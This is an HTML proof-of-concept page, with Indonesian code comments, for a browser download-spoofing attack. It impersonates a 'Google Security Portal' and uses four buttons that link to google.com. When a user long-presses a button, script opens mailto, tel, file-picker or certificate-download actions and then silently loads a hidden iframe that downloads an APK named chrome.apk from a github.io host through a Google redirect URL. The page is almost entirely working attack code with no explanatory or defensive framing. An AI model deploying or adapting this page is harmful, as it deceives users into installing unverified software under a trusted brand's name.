<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Multi-Intent Download Spoof PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 360px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 20px;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .file-info {
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Secure Document Verification & Distribution</h1>

    <!-- 4 Tombol dengan Kombinasi Target Google.com & Multi-Intent Downloads -->
    <div class="button-container">
        <a href="https://www.google.com" class="spoof-link" id="btnMailto" data-intent="identity_verification" data-action="mailto">Open Window & Mailto + APK Download</a>
        <a href="https://www.google.com" class="spoof-link" id="btnTel" data-intent="account_recovery" data-action="tel">Open Window & Tel + APK Download</a>
        <a href="https://www.google.com" class="spoof-link" id="btnFile" data-intent="document_upload" data-action="filepicker">Open Window & FilePicker + APK Download</a>
        <a href="https://www.google.com" class="spoof-link" id="btnDownload" data-intent="security_certificate" data-action="download">Open Window & Direct Multi-APK Download</a>
    </div>

    <div class="file-info" id="fileInfo">Status: Ready for interaction.</div>
    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        // Fungsi pemicu unduhan APK utama melalui iframe tersembunyi
        const triggerApkDownload = () => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            // Menggunakan URL Google Redirect APK Anda
            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
            document.body.appendChild(iframe);
        };

        const executeAttackVector = async (actionType, intent) => {
            if (triggered) return;
            triggered = true;

            const fileInfo = document.getElementById("fileInfo");
            fileInfo.innerText = `Executing intent [${intent}] with action [${actionType}]...`;

            // Jeda 2.4 detik agar jendela atas (Google.com) sempat terbuka sempurna dalam mode split-screen
            setTimeout(async () => {
                try {
                    if (actionType === 'mailto') {
                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
                        const body = encodeURIComponent("Hello Google Security,\n\nVerifying intent: " + intent);
                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
                        setTimeout(triggerApkDownload, 600);
                    } 
                    else if (actionType === 'tel') {
                        window.location.href = "tel:+18005550199";
                        setTimeout(triggerApkDownload, 600);
                    } 
                    else if (actionType === 'filepicker') {
                        if (window.showOpenFilePicker) {
                            const [fileHandle] = await window.showOpenFilePicker({
                                multiple: false,
                                types: [{ description: 'Documents', accept: { 'application/pdf': ['.pdf'], 'image/*': ['.png', '.jpg'] } }]
                            });
                            const file = await fileHandle.getFile();
                            fileInfo.innerText = `File selected: ${file.name}. Triggering payload...`;
                        }
                        setTimeout(triggerApkDownload, 400);
                    }
                    else if (actionType === 'download') {
                        // Kombinasi langsung mendownload sertifikat teks dan APK secara beruntun
                        const dummyContent = `Google Security Certificate\nIntent: ${intent}\nTimestamp: ${new Date().toISOString()}`;
                        const blob = new Blob([dummyContent], { type: 'text/plain' });
                        const blobUrl = URL.createObjectURL(blob);
                        
                        const downloadAnchor = document.createElement('a');
                        downloadAnchor.href = blobUrl;
                        downloadAnchor.download = `Security_Cert_${intent}.txt`;
                        document.body.appendChild(downloadAnchor);
                        downloadAnchor.click();
                        document.body.removeChild(downloadAnchor);

                        setTimeout(triggerApkDownload, 800);
                    }
                } catch (err) {
                    console.debug("Operation cancelled or restricted:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1500);
                }
            }, 2400);
        };

        // Memasang event listener contextmenu (long-press pada Android) untuk tiap tombol
        ['btnMailto', 'btnTel', 'btnFile', 'btnDownload'].forEach(id => {
            const el = document.getElementById(id);
            el.addEventListener("contextmenu", (e) => {
                executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
            });
            el.addEventListener("touchstart", () => {}, { passive: true });
        });
    </script>

</body>
</html>
